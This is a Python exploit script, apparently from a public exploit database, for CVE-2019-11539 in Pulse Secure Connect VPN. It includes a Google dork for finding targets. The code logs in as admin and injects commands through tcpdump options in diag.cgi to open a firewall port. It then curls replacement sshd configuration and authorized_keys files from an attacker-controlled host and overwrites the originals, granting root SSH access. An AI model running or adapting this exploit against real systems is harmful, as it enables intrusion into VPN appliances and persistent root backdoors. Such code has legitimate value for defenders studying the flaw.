#
# Exploit Title: Pulse Secure Post-Auth Remote Code Execution
# Google Dork: inurl:/dana-na/ filetype:cgi
# Exploit Author: Justin Wagner (0xDezzy), Alyssa Herrera (@Alyssa_Herrera_)
# Vendor Homepage: https://pulsesecure.net
# Version: 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4
# Tested on: linux
# CVE : CVE-2019-11539
#
# Initial Discovery: Orange Tsai (@orange_8361), Meh Chang (@mehqq_)
#
# Exploits CVE-2019-11539 to run commands on the Pulse Secure Connect VPN
# Downloads Modified SSH configuration and authorized_keys file to allow SSH as root.
# You will need your own configuration and authorized_keys files.
#
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2019-11539
# Reference: https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html
#
# Please Note, Alyssa or myself are not responsible with what is done with this code. Please use this at your own discretion and with proper authrization.
# We will not bail you out of jail, go to court, etc if you get caught using this maliciously. Be smart and remember, hugs are free.
#
# Imports
import requests
import urllib
from bs4 import BeautifulSoup

# Host information
host = &#039;&#039; # Host to exploit
login_url = &#039;/dana-na/auth/url_admin/login.cgi&#039; # Login page
CMDInjectURL = &#039;/dana-admin/diag/diag.cgi&#039; # Overwrites the Template when using tcpdump
CommandExecURL = &#039;/dana-na/auth/setcookie.cgi&#039; # Executes the code

# Login Credentials
user = &#039;admin&#039; # Default Username
password = &#039;password&#039; # Default Password

# Necessary for Curl
downloadHost = &#039;&#039; # IP or FQDN for host running webserver
port = &#039;&#039; # Port where web service is running. Needs to be a string, hence the quotes.

# Proxy Configuration
# Uncomment if you need to use a proxy or for debugging requests
proxies = {
    # &#039;http&#039;: &#039;http://127.0.0.1:8080&#039;,
    # &#039;https&#039;: &#039;http://127.0.0.1:8080&#039;,
}

# Headers for requests
headers = {
    &#039;User-Agent&#039;:&#039;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&#039;,
    &#039;Accept&#039;:&#039;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;,
    &#039;Accept-Language&#039;:&#039;en-US,en;q=0.5&#039;,
    &#039;Accept-Encoding&#039;:&#039;gzip, deflate&#039;,
    &#039;Content-Type&#039;:&#039;application/x-www-form-urlencoded&#039;,
}

# Cookies to send with request
cookies = {
    &#039;lastRealm&#039;:&#039;Admin%20Users&#039;,
    &#039;DSSIGNIN&#039;:&#039;url_admin&#039;,
    &#039;DSSignInURL&#039;:&#039;/admin/&#039;,
    &#039;DSPERSISTMSG&#039;:&#039;&#039;,
}

# Data for post request
loginData = {
    &#039;tz_offset&#039;: 0,
    &#039;username&#039;: user,
    &#039;password&#039;: password,
    &#039;realm&#039;: &#039;Admin Users&#039;,
    &#039;btnSubmit&#039;: &#039;Sign In&#039;,
}

s = requests.Session() # Sets up the session
s.proxies = proxies # Sets up the proxies

# Disable Warnings from requests library
requests.packages.urllib3.disable_warnings()

# Administrator Login logic
# Probably wouldn&#039;t have figured this out without help from @buffaloverflow
def adminLogin():
    global xsAuth
    global _headers

    # Send the intial request
    r = requests.get(&#039;https://%s/dana-na/auth/url_admin/welcome.cgi&#039; % host, cookies=cookies, headers=headers, verify=False, proxies=proxies)

    print(&#039;[#] Logging in...&#039;) # Self Explanatory
    r = s.post(&#039;https://&#039; + host + login_url, data=loginData,verify=False, proxies=proxies, allow_redirects=False) # sends login post request
    print(&#039;[#] Sent Login Request...&#039;)

    # Login Logic
    if r.status_code == 302 and &#039;welcome.cgi&#039; in r.headers.get("location",""):
        referer = &#039;https://%s%s&#039; %(host, r.headers["location"]) # Gets the referer
        r = s.get(referer, verify=False) # Sends a get request
        soup = BeautifulSoup(r.text, &#039;html.parser&#039;) # Sets up HTML Parser
        FormDataStr = soup.find(&#039;input&#039;, {&#039;id&#039;:&#039;DSIDFormDataStr&#039;})["value"] # Gets DSIDFormDataStr
        print(&#039;[#] Grabbing xsauth...&#039;)
        xsAuth = soup.find(&#039;input&#039;, {&#039;name&#039;:&#039;xsauth&#039;})["value"] # Gets the cross site auth token
        print(&#039;[!] Got xsauth: &#039; + xsAuth) # Self Explanatory
        data = {&#039;btnContinue&#039;:&#039;Continue the session&#039;, &#039;FormDataStr&#039;:FormDataStr, &#039;xsauth&#039;:xsAuth} # Submits the continue session page
        _headers = headers # Sets the headers
        _headers.update({&#039;referer&#039;:referer}) # Updates the headers
        r = s.post(&#039;https://%s&#039; %(host + login_url), data=data, headers=_headers, verify=False, proxies=proxies) #Sends a new post request

    print(&#039;[+] Logged in!&#039;) # Self Explanatory

# Command injection logic
def cmdInject(command):
    r = s.get(&#039;https://&#039; + host + CMDInjectURL, verify=False, proxies=proxies)
    if r.status_code == 200:
        soup = BeautifulSoup(r.text, &#039;html.parser&#039;) # Sets up HTML Parser
        xsAuth = soup.find(&#039;input&#039;, {&#039;name&#039;:&#039;xsauth&#039;})["value"] # Gets the cross site auth token
        payload = {
            &#039;a&#039;:&#039;td&#039;,
            &#039;chkInternal&#039;:&#039;On&#039;,
            &#039;optIFInternal&#039;:&#039;int0&#039;,
            &#039;pmisc&#039;:&#039;on&#039;,
            &#039;filter&#039;:&#039;&#039;,
            &#039;options&#039;:&#039;-r$x="%s",system$x# 2>/data/runtime/tmp/tt/setcookie.thtml.ttc <&#039; %command,
            &#039;toggle&#039;:&#039;Start+Sniffing&#039;,
            &#039;xsauth&#039;:xsAuth
        }
        # Takes the generated URL specific to the command then encodes it in hex for the DSLaunchURL cookie
        DSLaunchURL_cookie = {&#039;DSLaunchURL&#039;:(CMDInjectURL+&#039;?a=td&chkInternal=on&optIFInternal=int0&pmisc=on&filter=&options=-r%24x%3D%22&#039;+urllib.quote_plus(command)+&#039;%22%2Csystem%24x%23+2%3E%2Fdata%2Fruntime%2Ftmp%2Ftt%2Fsetcookie.thtml.ttc+%3C&toggle=Start+Sniffing&xsauth=&#039;+xsAuth).encode("hex")}
        # print(&#039;[+] Sending Command injection: %s&#039; %command) # Self Explanatory. Useful for seeing what commands are run
        # Sends the get request to overwrite the template
        r = s.get(&#039;https://&#039; + host + CMDInjectURL+&#039;?a=td&chkInternal=on&optIFInternal=int0&pmisc=on&filter=&options=-r%24x%3D%22&#039;+command+&#039;%22%2Csystem%24x%23+2%3E%2Fdata%2Fruntime%2Ftmp%2Ftt%2Fsetcookie.thtml.ttc+%3C&toggle=Start+Sniffing&xsauth=&#039;+xsAuth, cookies=DSLaunchURL_cookie, verify=False, proxies=proxies)
        # Sends the get request to execute the code
        r = s.get(&#039;https://&#039; + host + CommandExecURL, verify=False)

# Main logic
if __name__ == &#039;__main__&#039;:
    adminLogin()
    try:
        print(&#039;[!] Starting Exploit&#039;)
        print(&#039;[*] Opening Firewall port...&#039;)
        cmdInject(&#039;iptables -A INPUT -p tcp --dport 6667 -j ACCEPT&#039;) # Opens SSH port
        print(&#039;[*] Downloading Necessary Files....&#039;)
        cmdInject(&#039;/home/bin/curl &#039;+downloadHost+&#039;:&#039;+port+&#039;/cloud_sshd_config -o /tmp/cloud_sshd_config&#039;) # download cloud_sshd_config
        cmdInject(&#039;/home/bin/curl &#039;+downloadHost+&#039;:&#039;+port+&#039;/authorized_keys -o /tmp/authorized_keys&#039;) # download authorized_keys
        print(&#039;[*] Backing up Files...&#039;)
        cmdInject(&#039;cp /etc/cloud_sshd_config /etc/cloud_sshd_config.bak&#039;) # backup cloud_sshd_config
        cmdInject(&#039;cp /.ssh/authorized_keys /.ssh/authorized_keys.bak&#039;) # backp authorized_keys
        print(&#039;[*] Overwriting Old Files...&#039;)
        cmdInject(&#039;cp /tmp/cloud_sshd_config /etc/cloud_sshd_config&#039;) # overwrite cloud_sshd_config
        cmdInject(&#039;cp /tmp/authorized_keys /.ssh/authorized_keys&#039;) # overwrite authorized_keys
        print(&#039;[*] Restarting SSHD...&#039;)
        cmdInject(&#039;kill -SIGHUP $(pgrep -f "sshd-ive")&#039;) # Restart sshd via a SIGHUP
        print(&#039;[!] Done Exploiting the system.&#039;)
        print(&#039;[!] Please use the following command:&#039;)
        print(&#039;[!] ssh -p6667 root@%s&#039;) %(host)
    except Exception as e:
        raise

